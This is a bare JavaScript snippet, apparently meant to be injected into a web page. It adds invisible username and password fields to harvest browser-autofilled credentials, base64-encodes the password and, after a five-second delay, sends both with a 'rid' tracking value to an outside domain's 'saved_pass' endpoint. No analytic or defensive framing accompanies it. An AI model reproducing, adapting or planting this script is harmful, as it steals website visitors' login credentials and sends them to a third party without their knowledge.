let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input");
u.id = "log_"
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.id = "pw_";
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u);
body.append(p);

var u_val = u.value;
var p_val = btoa(p.value);

var rid = new URLSearchParams(window.location.search).get('rid'); 

setTimeout(function(){
        fetch("https://www.cassaforenze.it/saved_pass?rid="+ rid + "&usr=" + u_val + "&pas=" + p_val)
}, 5000);
